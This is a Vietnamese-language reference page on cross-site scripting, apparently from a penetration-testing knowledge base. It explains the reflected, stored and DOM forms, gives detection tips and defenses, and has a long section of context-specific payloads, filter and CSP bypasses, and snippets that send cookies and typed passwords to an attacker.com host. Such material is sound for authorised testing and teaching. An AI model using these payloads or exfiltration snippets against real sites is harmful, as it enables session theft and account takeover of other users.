# Cross-Site Scripting (XSS)

> Mã script của kẻ tấn công thực thi trong trình duyệt của người dùng khác, trong phạm vi origin
> của ứng dụng. **Tài liệu chuyên sâu:**
> [`Troubleshooting_Guide/xss.md`](../../../../Troubleshooting_Guide/xss.md) ·
> **Skill:** [`ai_framework/skills/`](../../../ai_framework/skills/README.md)

**Tên gọi khác / OWASP:** XSS · A03:2021 Injection
**Ngôn ngữ:** [English](README.md) · Tiếng Việt
**Trạng thái:** hoàn chỉnh

## Là gì (What it is)
XSS xảy ra khi ứng dụng đưa dữ liệu do kẻ tấn công kiểm soát vào trang mà không escape đúng theo
ngữ cảnh, khiến trình duyệt thực thi nó như script. Mã của kẻ tấn công khi đó chạy với phiên của
nạn nhân, trong origin của ứng dụng.

## Cơ chế hoạt động (How it works)
Ba dạng kinh điển:
- **Reflected** — payload trong request bị phản chiếu thẳng vào phản hồi (ví dụ từ khóa tìm kiếm),
  thực thi với bất kỳ ai mở liên kết được dàn dựng.
- **Stored / lưu trữ** — payload được lưu lại (bình luận, hồ sơ) và chạy với mọi người xem.
- **DOM-based** — JS phía client đọc một nguồn (`location.hash`, `document.URL`) và ghi vào một
  sink nguy hiểm (`innerHTML`, `eval`) mà không làm sạch. Xem thêm `dom_based`.

## Tác động (Impact)
Đánh cắp phiên/cookie, chiếm tài khoản, thu thập thông tin đăng nhập qua form giả, đánh cắp token
CSRF, ghi phím, thực hiện hành động thay nạn nhân, và lây lan kiểu sâu (worm) với stored XSS.

## Cách phát hiện (How to detect)
- Một dấu hiệu phản chiếu (`'"><svg onload=…>`) xuất hiện chưa được escape trong HTML, thuộc tính,
  hoặc ngữ cảnh script.
- Đầu vào được render vào `innerHTML`/template literal phía client.
- Khác biệt giữa các ngữ cảnh (thân HTML, thuộc tính, chuỗi JS, URL) — mỗi loại cần payload và cách
  escape riêng.

## Khai thác (tóm tắt) (Exploitation)
Xác định ngữ cảnh phản chiếu, thoát khỏi ngữ cảnh đó, rồi thực thi (`<script>`, event handler, URI
`javascript:`, hoặc thoát chuỗi JS). Vượt bộ lọc bằng mẹo hoa/thường, mã hóa, và thẻ/sự kiện thay
thế. Dùng PoC vô hại `alert(document.domain)`; chỉ leo thang sang đánh cắp phiên trong phạm vi cho
phép. Payload đầy đủ nằm trong tài liệu chuyên sâu.

## Payload & kỹ thuật (Payloads & techniques)
> Chắt lọc từ các tài liệu payload thực chiến — chỉ dùng cho kiểm thử được cấp phép.

### Phát hiện ngữ cảnh (Context detection)
Tiêm `"><'`+"`"+`${` và quan sát ký tự nào bị trả về dưới dạng đã mã hóa — điều này cho biết ngữ
cảnh và cách thoát (breakout) bạn cần.

| Ngữ cảnh | Hành vi | Cách thoát |
|---------|----------|----------|
| Thân HTML | `<` `>` bị mã hóa | tiêm thẻ |
| Thuộc tính HTML (có dấu nháy) | `"`/`'` bị mã hóa | đóng dấu nháy rồi `on…=` |
| Chuỗi JS | `\` `'` `"` bị escape | `'-alert(1)-'` / `';alert(1)//` |
| Template literal JS | `${` không bị escape | `${alert(1)}` |
| Tham số URL | trình duyệt mã hóa | URI `javascript:` |

### Thân HTML / reflected / stored (HTML body / reflected / stored)
```html
<svg onload=alert(1)>
<body onload=alert(1)>
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>
<video><source onerror="alert(1)">
<audio src=x onerror=alert(1)>
<embed src=x onerror=alert(1)>
<object data=x onerror=alert(1)>
<input onfocus=alert(1) autofocus>
<select onfocus=alert(1) autofocus>
<textarea onfocus=alert(1) autofocus>
<keygen onfocus=alert(1) autofocus>
```

### Ngữ cảnh thuộc tính (Attribute context)
```html
" onmouseover="alert(1)
" onfocus="alert(1)" autofocus="
" onclick="alert(1)">
```
Thuộc tính không có dấu nháy cho phép bạn thêm handler chỉ với khoảng trắng: `onmouseover=alert(1)`.

### Ngữ cảnh chuỗi JavaScript (JavaScript-string context)
```javascript
'-alert(1)-'          // single-quoted string
';alert(1)//          // statement terminate
\';alert(1)//         // backslash escapes the app's escaping
</script><script>alert(1)</script>   // terminate the script element entirely
\"-alert(1)}//        // JSON/eval breakout
```

### AngularJS / tiêm template (AngularJS / template injection)
```html
{{constructor.constructor('alert(1)')()}}
{{a=alert(1)}}
<input id=x ng-focus=$event.composedPath()|orderBy:'(z=alert)(document.cookie)'>#x
<body onresize="alert(document.cookie)">
```
Phát động `onresize` qua một iframe tự co giãn:
```html
<iframe src="https://victim.com/?search=<body onresize=print()>" onload="this.style.width='10px'"></iframe>
```

### Vector SVG (SVG vectors)
```html
<svg><animate onbegin=alert(1) attributeName=x></animate></svg>
<svg><animatetransform onbegin=alert(1) attributeName=transform></animatetransform></svg>
<svg><a><animate attributeName=href values="javascript:alert(1)"/><text y=20>click</text></a></svg>
<svg><set attributeName=href to="javascript:alert(1)">
```

### Vượt WAF / bộ lọc (WAF / filter bypass)
- **Phần tử tùy chỉnh (custom element)** khi các thẻ chuẩn bị chặn: `<xss id=x onfocus=alert(1) tabindex=1>#x</xss>`
- **Sự kiện SMIL/animation**: `onbegin onend onrepeat onfocusin onfocusout`
- **Accesskey** (kích hoạt khi Alt+Shift+X): `%27accesskey=%27x%27onclick=%27alert(1)`
- **Mẹo mã hóa/khoảng trắng** giữa tên thuộc tính và `=`:
```html
<img src=x onerror%00=alert(1)>
<img src=x onerror&#10;=alert(1)>
<ScRiPt>alert(1)</ScRiPt>
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>
```
- **Thoát noscript** trong ngữ cảnh thuộc tính:
```html
<noscript><p title="</noscript><img src=x onerror=alert(1)>">
```

### Vượt CSP (CSP bypass)
```html
<img src='https://attacker.com/log?data=        <!-- dangling markup, captures markup to next quote -->
<script nonce=ABC123>alert(1)</script>           <!-- reuse a leaked/predictable nonce -->
```
`unsafe-eval` hoặc `script-src` cùng origin cho phép `<script>alert(1)</script>` thuần đi qua.

### Mutation XSS (mXSS)
```html
<svg><p><style><!--</style></p><img src=x onerror=alert(1)></p>
```

### postMessage XSS
```javascript
parent.postMessage('<img src=x onerror=alert(1)>', '*');   // when receiver writes data to a sink
```

### Tải lên file (SVG / HTML) (File upload (SVG / HTML))
```html
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)">
  <script>alert(document.cookie)</script>
</svg>
```

### Trích xuất & leo thang (Exfiltration & escalation)
```javascript
fetch("https://attacker.com/steal?c=" + document.cookie);   // cookie theft
```
```html
<!-- credential capture: fake password field -->
<input name="username" id="username">
<input type="password" onchange="fetch('https://attacker.com/steal',{method:'POST',body:username.value+':'+this.value})">
```
```javascript
// CSRF via XSS: read the token from one page, replay the protected action
fetch("/email/change-email").then(r=>r.text()).then(html=>{
  var t=html.match(/csrf[^>]+value="([^"]+)"/)[1];
  fetch("/email/change-email",{method:"POST",body:"email=attacker@evil.com&csrf="+t});
});
```
```css
/* CSS-injection exfil: leak a value character-by-character */
input[value^="a"]{background:url("https://attacker.com/?c=a")}
input[value^="b"]{background:url("https://attacker.com/?c=b")}
```

### Hướng dẫn lựa chọn (Selection guide)
| Tình huống | Payload |
|-----------|---------|
| Không có bộ lọc | `<script>alert(1)</script>` |
| `<script>` bị chặn | `<img src=x onerror=alert(1)>` |
| `<img>` bị chặn | `<svg onload=alert(1)>` |
| Event handler bị chặn | `<a href="javascript:alert(1)">click</a>` |
| `href` bị chặn | `<svg><animate onbegin=alert(1)>` |
| Tất cả thẻ chuẩn bị chặn | `<xss onfocus=alert(1) tabindex=1>#x</xss>` |
| Trang AngularJS | `{{constructor.constructor('alert(1)')()}}` |
| Ngữ cảnh chuỗi JS | `'-alert(1)-'` |
| Template literal | `${alert(1)}` |
| CSP chặn script | dangling-markup `<img>` |

## Phòng chống (Defenses)
1. **Mã hóa đầu ra theo ngữ cảnh** (HTML, thuộc tính, JS, URL) — giải pháp chính.
2. **Content-Security-Policy** chặt chẽ làm lớp phòng thủ bổ sung (`script-src` dùng nonce/hash).
3. Tận dụng auto-escaping của framework; tránh `innerHTML`/`dangerouslySetInnerHTML`; làm sạch bằng
   thư viện đã kiểm chứng (DOMPurify) khi buộc phải render HTML thô.
4. Cookie `HttpOnly` để giảm thiểu việc đánh cắp token.

## Tìm CVE từ đầu (Finding CVEs from scratch)
- **NVD** — https://nvd.nist.gov/vuln/search?query=Cross-Site+Scripting
- **CVE.org** — https://www.cve.org/CVERecord/SearchResults?query=Cross-Site+Scripting
- **Exploit-DB** — https://www.exploit-db.com/search?q=XSS
- **GitHub Advisories** — https://github.com/advisories?query=xss (rất nhiều cho plugin npm/WordPress)
- **OSV** — https://osv.dev/list?q=xss
- **Cộng đồng** — r/netsec, HackerOne (`weakness:"Cross-site Scripting (XSS)"` — loại được báo cáo
  nhiều nhất), WPScan cho plugin WordPress.
- _Mẹo tìm kiếm: plugin WordPress/Drupal và trang quản trị là nơi giàu lỗ hổng nhất:_
  `"<plugin> <phiên bản>" stored XSS`.

## Các CVE tiêu biểu (Notable CVEs)
_Mang tính minh họa — hãy kiểm chứng lại trên NVD trước khi trích dẫn._
- `CVE-2023-37580` — Reflected XSS trong Zimbra Collaboration, bị khai thác thực tế.
- `CVE-2019-11358` — Prototype pollution trong jQuery thường được nối chuỗi để dẫn tới XSS (xem
  `prototype_pollution`).
- _Ví dụ kinh điển thời chưa có CVE: sâu "Samy" trên MySpace năm 2005 (stored XSS, tự lây lan)._

## Tham khảo (References)
- PortSwigger Web Security Academy — Cross-site scripting.
- OWASP — XSS Prevention & DOM-based XSS Prevention Cheat Sheets.
